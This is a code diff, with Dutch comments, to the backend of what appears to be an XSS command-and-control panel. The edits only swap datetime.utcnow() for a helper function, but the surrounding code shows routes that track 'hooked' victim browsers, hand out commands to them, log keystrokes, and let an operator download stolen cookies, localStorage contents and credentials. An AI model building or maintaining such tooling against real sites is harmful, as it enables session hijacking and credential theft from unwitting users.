@@ -135,7 +135,7 @@ def xss_c2():
     # Heartbeat: update datum van hooked record zodat we "last seen" bijhouden
     hooked = db_xxs_hooked.query.filter_by(ip=ip).first()
     if hooked:
-        hooked.datum = datetime.datetime.utcnow()
+        hooked.datum = nu_utc()
         db.session.commit()
 
     cmds = db_xxs_commands.query.filter(
@@ -234,7 +234,7 @@ def api_xxs_commands_clear():
 @xxs_bp.route("/api/xxs/hooked", methods=["GET"])
 def api_xxs_hooked():
     require_dashboard_access()
-    cutoff = datetime.datetime.utcnow() - datetime.timedelta(minutes=5)
+    cutoff = nu_utc() - datetime.timedelta(minutes=5)
     recent = db_xxs_hooked.query.filter(
         db_xxs_hooked.datum >= cutoff
     ).order_by(db_xxs_hooked.datum.desc()).all()
@@ -296,7 +296,7 @@ def xss_keylogger():
 
 @xxs_bp.route("/dashboard/xxs", methods=["GET", "POST"])
 def xxs_dashboard():
-    cutoff = datetime.datetime.utcnow() - datetime.timedelta(minutes=5)
+    cutoff = nu_utc() - datetime.timedelta(minutes=5)
     recent = db_xxs_hooked.query.filter(db_xxs_hooked.datum >= cutoff).all()
 
     # Unieke IPs: bewaar alleen de meest recente entry per IP
@@ -317,7 +317,7 @@ def xxs_dashboard():
 @xxs_bp.route("/dashboard/xxs/download_cookies/<int:id>", methods=["GET", "POST"])
 def xxs_download_cookies(id):
 
-    date = datetime.datetime.utcnow()
+    date = nu_utc()
     tijdstip = calendar.timegm(date.utctimetuple())
 
     cookies = db_xxs_cookies.query.filter_by(id=id)
@@ -342,7 +342,7 @@ def xxs_download_cookies(id):
 @xxs_bp.route("/dashboard/xxs/download_toetsen/<int:id>", methods=["GET", "POST"])
 def xxs_download_toetsen(id):
 
-    date = datetime.datetime.utcnow()
+    date = nu_utc()
     tijdstip = calendar.timegm(date.utctimetuple())
 
     data = db_xxs_keylogger.query.filter_by(id=id).first()
@@ -364,7 +364,7 @@ def xxs_download_toetsen(id):
 @xxs_bp.route("/dashboard/xxs/download_localstorage/<int:id>", methods=["GET", "POST"])
 def xxs_download_localstorage(id):
 
-    date = datetime.datetime.utcnow()
+    date = nu_utc()
     tijdstip = calendar.timegm(date.utctimetuple())
 
     data = db_xxs_localstorage.query.filter_by(id=id).first()
@@ -386,7 +386,7 @@ def xxs_download_localstorage(id):
 @xxs_bp.route("/dashboard/xxs/download_creds/<int:id>", methods=["GET", "POST"])
 def xxs_download_creds(id):
 
-    date = datetime.datetime.utcnow()
+    date = nu_utc()
     tijdstip = calendar.timegm(date.utctimetuple())
 
     data = db_xxs_localstorage.query.filter_by(id=id).first()
